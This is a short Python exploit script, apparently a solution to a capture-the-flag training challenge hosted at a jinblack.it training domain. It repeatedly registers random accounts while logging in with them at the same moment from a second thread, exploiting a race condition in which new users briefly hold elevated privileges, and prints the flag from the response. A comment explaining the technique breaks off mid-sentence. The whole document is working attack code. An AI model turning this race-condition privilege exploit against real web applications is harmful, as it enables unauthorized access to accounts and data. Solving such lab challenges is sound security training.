import requests
import threading
import random
import string
import time

base_url = 'http://aart.training.jinblack.it'

def login(session, username, password):
    url = base_url + '/login.php'
    data = {'username': username, 'password': password}
    response = session.post(url, data=data)
    if('flag' in response.text):
        flag = response.text.split('flag{')[1].split('}')[0]
        print('flag{' + flag + '}')
    return response.text

def register(session, username, password):
    url = base_url + '/register.php'
    data = {'username': username, 'password': password}
    response = session.post(url, data=data)
    return response.text


# Exploit the race condition to register a user with privileges, there is a window when the user is created but not yet deprived of privileges
# Then we can login with the user and get the flag, but if that fails we cannot try with the same user again be

def random_user():
    # return username and password randomly
    username = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(10))
    password = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(10))
    return username, password

while True:
    s = requests.Session() # Create a session object, used to keep track of cookies
    u, p = random_user()

    t1 = threading.Thread(target=register, args=(s, u, p))
    t2 = threading.Thread(target=login, args=(s, u, p))

    t1.start()
    t2.start()

    t1.join()
    t2.join()

    time.sleep(0.1)